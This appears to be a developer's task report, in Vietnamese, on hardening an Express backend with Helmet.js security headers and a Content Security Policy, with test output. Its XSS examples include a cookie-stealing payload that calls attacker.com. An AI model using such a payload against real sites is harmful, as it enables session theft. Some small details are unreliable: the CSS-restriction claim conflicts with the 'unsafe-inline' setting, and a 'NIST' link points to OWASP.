# Task Report: Thiết lập HTTP Security Headers và CSP

## Mô tả Task

Thiết lập HTTP security headers và Content Security Policy (CSP) cho backend để bảo vệ ứng dụng khỏi các loại tấn công web phổ biến.

### Các loại tấn công cần ngăn chặn:

#### 1. **XSS Attack (Cross-Site Scripting)**
- **Vấn đề**: Hacker chèn code JavaScript độc hại vào trang web, ví dụ: `<script>alert('hacked')</script>`
- **Tác hại**: Steal cookies, sessions, redirect người dùng, thay đổi nội dung trang
- **Ví dụ**: Một bình luận chứa `<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">`
- **Giải pháp**: Sử dụng **Content-Security-Policy** để chỉ cho phép script từ những nguồn tin cậy

#### 2. **MIME-Type Sniffing**
- **Vấn đề**: Browser tự động "đoán" loại file thay vì tin cây header `Content-Type`
- **Tác hại**: File `.txt` có chứa JavaScript có thể được execute như `.js`
- **Ví dụ**: Hacker upload file `malicious.txt` chứa code JS, server gửi với `Content-Type: text/plain`, nhưng IE/Chrome coi nó là script
- **Giải pháp**: Header `X-Content-Type-Options: nosniff` bắt browser tuân theo Content-Type

#### 3. **Clickjacking Attack**
- **Vấn đề**: Hacker ẩn trang web thực dưới một layer trong suốt, rồi mồi chèo click
- **Tác hại**: vô tình click button ở trang giả, thực hiện hành động mà không muốn (chuyển tiền, thay password)
- **Ví dụ**: Trang fake YouTube với iframe chứa Amazon checkout, đang xem video nhưng click chính là submit mua hàng
- **Giải pháp**: Header `X-Frame-Options: DENY` ngăn không cho embed trang vào `<iframe>`

#### 4. **HTTPS Enforcement**
- **Vấn đề**: Traffic HTTP không mã hóa, hacker có thể intercept dữ liệu (man-in-the-middle attack)
- **Tác hại**: Steal passwords, session tokens, dữ liệu nhạy cảm
- **Ví dụ**: Kết nối WiFi công cộng, hacker sniff được password đăng nhập
- **Giải pháp**: Header **Strict-Transport-Security (HSTS)** bắt browser dùng HTTPS từ lần truy cập tiếp theo

#### 5. **Inline Script Execution**
- **Vấn đề**: Code JavaScript inline (embedded trực tiếp trong HTML) dễ bị inject
- **Tác hại**: Hacker có thể chèn `<script>` ngay vào HTML response, execute ngay mà không cần inject từ external source
- **Ví dụ**: Comment user không được sanitize: `<!-- <script>fetch('https://attacker.com')</script> -->`
- **Giải pháp**: CSP directive `script-src 'self'` chỉ cho phép script từ same domain, **từ chối tất cả inline scripts**

---

## Công việc hoàn thành

### 1. Cài đặt Helmet.js
- **Tệp**: `be/package.json`
- **Lệnh**: `npm install helmet`
- **Version**: ^8.x
- **Tác dụng**: Middleware bảo mật tự động set các HTTP headers tiêu chuẩn

### 2. Tạo Security Middleware
- **Tệp**: `be/src/middlewares/security.middleware.js` 
- **Nội dung**:
  - Import Helmet
  - Cấu hình các security directives
  - Content-Security-Policy 
  - CSP violation report handler (endpoint `/api/v1/security/csp-report`)

### 3. Tích hợp vào Server
- **Tệp**: `be/src/server.js`
- **Thay đổi**:
  - Import security middleware
  - Apply middleware vào Express app: `app.use(securityMiddleware)`
  - Thêm endpoint CSP report: `POST /api/v1/security/csp-report`

### 4. Test & Verify
Chạy:
$response = Invoke-WebRequest -Uri 'http://localhost:5001/' -UseBasicParsing  //gửi HTTP GET đến localhost => lưu dữ liệu trả về từ server vào respones
$response.StatusCode //kiểm tra status
$response.Headers  # in tất cả headers
$response.Headers['content-security-policy']  # chỉ in CSP

---

## Security Headers Được Thiết Lập (kết quả)

### X-XSS-Protection
```
Value: 0
Tác dụng: Vô hiệu hóa XSS filter cũ (modern browsers sử dụng CSP)
```

### X-Content-Type-Options
```
Value: nosniff
Tác dụng: Ngăn browser sniff MIME-type, bắt buộc sử dụng Content-Type
Ví dụ: .js file phải được serve với Content-Type: application/javascript
```

### Strict-Transport-Security (HSTS)
```
Value: max-age=31536000; includeSubDomains; preload
Tác dụng: 
  - max-age=31536000: Bắt buộc HTTPS trong 1 năm
  - includeSubDomains: Áp dụng cho tất cả subdomains
  - preload: Thêm vào HSTS preload list
```

### Content-Security-Policy (CSP)
```
default-src 'self';script-src 'self';style-src 'self' 'unsafe-inline';img-src 'self' data: https:;font-src 'self' data:;connect-src 'self' http://localhost:* https://*.example.com;frame-src 'none';object-src 'none';base-uri 'self';form-action 'self';frame-ancestors 'none';script-src-attr 'none';upgrade-insecure-requests

Tác dụng:
  - Ngăn chặn inline scripts (chỉ cho phép external scripts từ 'self')
  - Chỉ cho phép CSS từ same-origin
  - Ngăn clickjacking via <iframe>
  - Ngăn plugin execution (<object>, <embed>)
```

### X-Frame-Options
```
Value: DENY
Tác dụng: Ngăn page được embed trong <iframe> (chống clickjacking)
```

### Referrer-Policy
```
Value: strict-origin-when-cross-origin
Tác dụng: 
  - Khi cross-origin: chỉ gửi origin
  - Khi same-origin: gửi full URL
```

---

## Test Results

```
=== HTTP RESPONSE HEADERS ===

Status: 200

Security Headers:
────────────────────────────────────────────────────────────
✓ x-xss-protection: 0
✓ x-content-type-options: nosniff
✓ strict-transport-security: max-age=31536000; includeSubDomains; preload
✓ content-security-policy: default-src 'self';script-src 'self'...
✓ x-frame-options: DENY
✓ referrer-policy: strict-origin-when-cross-origin
────────────────────────────────────────────────────────────
```

**Kết luận**: Tất cả security headers được set đúng

---

## 📚 Tài Liệu Tham Khảo

- [Helmet.js Documentation](https://helmetjs.github.io/)
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP Security Headers](https://owasp.org/www-project-secure-headers/)
- [HTTP Security Headers (NIST)](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)

